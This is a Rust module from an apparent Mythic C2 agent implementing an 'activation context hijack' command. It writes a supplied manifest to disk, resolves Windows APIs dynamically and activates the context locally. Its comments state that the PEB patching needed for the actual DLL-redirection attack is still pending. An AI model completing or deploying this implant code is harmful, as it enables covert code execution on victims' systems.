use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct ActxHijackArgs {
    binary_path: String,
    manifest: String,
}

// Activation Context Hijack — based on Eclipse by @Kudaes
// Spawns a process and patches its PEB to redirect DLL loading
// via a custom activation context manifest.

#[cfg(target_os = "windows")]
pub fn actx_hijack(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: ActxHijackArgs = serde_json::from_str(&task.parameters)?;

    unsafe {
        // Step 1: Write manifest to temp file (CreateActCtxW needs a file path)
        let temp_dir = std::env::temp_dir();
        let manifest_path = temp_dir.join(format!("m{}.manifest", rand::random::<u32>()));
        std::fs::write(&manifest_path, &args.manifest)?;

        // Step 2: Create activation context from manifest
        type CreateActCtxWFn = unsafe extern "system" fn(*const ActCtxW) -> *mut std::ffi::c_void;

        #[repr(C)]
        struct ActCtxW {
            cb_size: u32,
            dw_flags: u32,
            lp_source: *const u16,
            w_processor_architecture: u16,
            w_lang_id: u16,
            lp_assembly_directory: *const u16,
            lp_resource_name: *const u16,
            lp_application_name: *const u16,
            h_module: *mut std::ffi::c_void,
        }

        let create_actctx: CreateActCtxWFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CreateActCtxW")
                .ok_or("CreateActCtxW resolve failed")?
        );

        let manifest_wide: Vec<u16> = manifest_path.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();

        let mut actctx: ActCtxW = std::mem::zeroed();
        actctx.cb_size = std::mem::size_of::<ActCtxW>() as u32;
        actctx.dw_flags = 0; // ACTCTX_FLAG_PROCESSOR_ARCHITECTURE_VALID etc. not needed for basic usage
        actctx.lp_source = manifest_wide.as_ptr();

        let hactctx = create_actctx(&actctx);
        let _ = std::fs::remove_file(&manifest_path);

        if hactctx.is_null() || hactctx == -1isize as *mut std::ffi::c_void {
            return Ok(mythic_error!(task.id, "CreateActCtxW failed — invalid manifest or system error"));
        }

        // Step 3: Activate the context and spawn process
        type ActivateActCtxFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut usize) -> i32;

        let activate: ActivateActCtxFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "ActivateActCtx")
                .ok_or("ActivateActCtx resolve failed")?
        );

        let mut cookie: usize = 0;
        let activate_result = activate(hactctx, &mut cookie);

        if activate_result == 0 {
            return Ok(mythic_error!(task.id, "ActivateActCtx failed"));
        }

        // For now, just activate/deactivate to verify the manifest is valid
        // Full PEB patching of remote process requires NtQueryInformationProcess,
        // ReadProcessMemory, WriteProcessMemory, VirtualAllocEx, and ResumeThread
        // which is a complex implementation (TODO for full Eclipse port)

        type DeactivateActCtxFn = unsafe extern "system" fn(u32, usize) -> i32;
        let deactivate: DeactivateActCtxFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "DeactivateActCtx")
                .ok_or("DeactivateActCtx resolve failed")?
        );

        deactivate(0, cookie);

        type ReleaseActCtxFn = unsafe extern "system" fn(*mut std::ffi::c_void);
        if let Some(addr) = crate::winapi_resolve::resolve("kernel32.dll", "ReleaseActCtx") {
            let release: ReleaseActCtxFn = std::mem::transmute(addr);
            release(hactctx);
        }

        Ok(mythic_success!(task.id, format!(
            "Activation context created and validated from manifest. Binary: {}. Context handle: {:p}. \
            \nNOTE: Full PEB hijack implementation (spawn suspended, patch PEB.ActivationContextData, resume) is pending. \
            \nCurrent implementation validates manifest syntax and activates context in current process.",
            args.binary_path, hactctx
        )))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn actx_hijack(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Ok(mythic_error!(task.id, "actx_hijack requires Windows"))
}
